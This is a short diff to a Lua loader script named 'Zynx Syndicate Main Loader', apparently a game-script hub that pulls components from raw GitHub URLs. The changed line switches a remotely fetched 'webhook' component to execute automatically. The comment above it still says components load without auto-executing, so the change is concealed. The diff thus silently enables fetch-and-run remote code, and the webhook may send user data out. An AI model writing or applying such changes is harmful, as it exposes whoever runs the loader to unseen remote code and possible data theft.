@@ -44,7 +44,7 @@ function MainLoader.initialize()
     print("🚀 Initializing Zynx Syndicate Main Loader...")
     
     -- Load components WITHOUT auto-executing them
-    MainLoader.components.webhook = MainLoader.loadScript("https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/webhook", false)
+    MainLoader.components.webhook = MainLoader.loadScript("https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/webhook", true)
     MainLoader.components.halfScreen = MainLoader.loadScript("https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/half%20loading", false)
     MainLoader.components.fullScreen = MainLoader.loadScript("https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/full%20loading", false)
     MainLoader.components.cmdLine = MainLoader.loadScript("https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/cmdline", false)
